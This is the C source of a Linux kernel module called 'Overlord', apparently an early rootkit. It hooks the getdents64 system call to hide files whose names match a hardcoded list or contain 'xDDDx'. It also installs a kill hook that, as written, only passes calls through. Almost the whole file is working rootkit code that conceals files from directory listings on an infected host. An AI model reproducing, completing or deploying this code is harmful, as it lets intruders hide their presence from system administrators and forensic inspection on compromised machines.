#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/linkage.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>

#include <linux/dirent.h>
#include <linux/string.h>

#include "syscall.h"

MODULE_LICENSE("GPL"); // nt torvalds

static int is_dir_hidden(const char *name) {
    static const char *hidden_files[] = {"lolzor", "1337.hidden", "abcdef", "zabcdef"};
    static const char *hidden_substrs[] = {"xDDDx"};

    for (int i = 0; i < sizeof(hidden_files) / sizeof(hidden_files[0]); i++)
        if (!strcmp(name, hidden_files[i]))
            return 1;

    for (int i = 0; i < sizeof(hidden_substrs) / sizeof(hidden_substrs[0]); i++)
        if (strstr(name, hidden_substrs[i]))
            return 1;

    return 0;
}

asmlinkage long hooked_getdents64(struct pt_regs *regs) {
    long size = (orig_syscall(__NR_getdents64))(regs);
    long nsize = size;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user*)regs->si;

    // Allocate and copy dirent array from userspace
    char *buf = kmalloc(size, GFP_KERNEL);
    if (!buf)
        goto ret;

    if (copy_from_user(buf, dirent, size))
        goto ret;

    struct linux_dirent64 *dir = NULL;
    for (unsigned long offset = 0; offset < nsize; offset += dir->d_reclen) {
        dir = (struct linux_dirent64*)(buf + offset);
        if (is_dir_hidden(dir->d_name)) {
            int len = dir->d_reclen;

            if (offset < nsize)
                memcpy(buf + offset, buf + offset + len, nsize - (offset + len));

            nsize -= len;
            offset -= len;
        }
    }

    if (copy_to_user(dirent, buf, size))
        nsize = size;

ret:
    kfree(buf);
    return nsize;
}

asmlinkage long hooked_kill(struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->di;
    int signal = (int)regs->si;
    return (orig_syscall(__NR_kill))(regs);
}

static int __init overlord_init(void) {
    syscall_setup();
    printk(KERN_INFO "[Overlord] Hello World!\n");
    hook_syscall(&hooked_getdents64, __NR_getdents64);
    hook_syscall(&hooked_kill, __NR_kill);
    return 0;
}

static void __exit overlord_exit(void) {
    syscall_rollback();
    printk(KERN_INFO "[Overlord] Goodbye World!\n");
}

module_init(overlord_init);
module_exit(overlord_exit);
